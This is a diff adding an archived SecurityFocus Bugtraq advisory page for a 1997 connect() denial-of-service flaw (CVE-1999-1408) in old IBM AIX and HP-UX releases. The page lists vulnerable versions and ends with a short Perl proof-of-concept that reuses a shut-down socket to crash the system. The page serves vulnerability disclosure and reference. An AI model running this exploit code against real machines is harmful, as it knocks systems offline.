@@ -1,0 +1,141 @@
+<p><b><span style="font-size: 18pt;">Multiple Vendor connect() Denial of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/352/info">info</a><br><a href="http://www.securityfocus.com/bid/352/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/352/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/352/solution">solution</a><br><a href="http://www.securityfocus.com/bid/352/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				352
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-1408<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 05 1997 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 12:16AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This bug was posted to the Bugtraq mailing list by Cahya Wirawan &lt;cwirawan@EMAIL.ARCHLAB.TUWIEN.AC.AT&gt; on Wed, 5 March 1997.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					IBM AIX 4.1.5 <br/>
+					
+				
+					IBM AIX 4.1.4 <br/>
+					
+				
+					IBM AIX 4.1.3 <br/>
+					
+				
+					IBM AIX 4.1.2 <br/>
+					
+				
+					IBM AIX 4.1.1 <br/>
+					
+				
+					IBM AIX 4.1 <br/>
+					
+				
+					HP HP-UX 10.20 <br/>
+					
+				
+					HP HP-UX 10.1 0<br/>
+					
+				
+					HP HP-UX 9.5 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					IBM AIX 4.3 <br/>
+					
+				
+					IBM AIX 4.2.1 <br/>
+					
+				
+					IBM AIX 4.2 <br/>
+					
+				
+					IBM AIX 3.2.5 <br/>
+					
+				
+					IBM AIX 3.2.4 <br/>
+					
+				
+					IBM AIX 3.2 <br/>
+					
+				
+					IBM AIX 3.1 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	#!/usr/local/bin/perl5<br/>use Socket;<br/><br/>socket (SOCK,AF_INET,SOCK_STREAM,0);<br/>$iaddr = inet_aton('localhost');<br/>$paddr = sockaddr_in('23',$iaddr);<br/>connect SOCK,$paddr;<br/>shutdown SOCK,2;<br/>$paddr = sockaddr_in('24',$iaddr);<br/>connect SOCK,$paddr;
+	
+		<ul>
+</ul>
+</div>
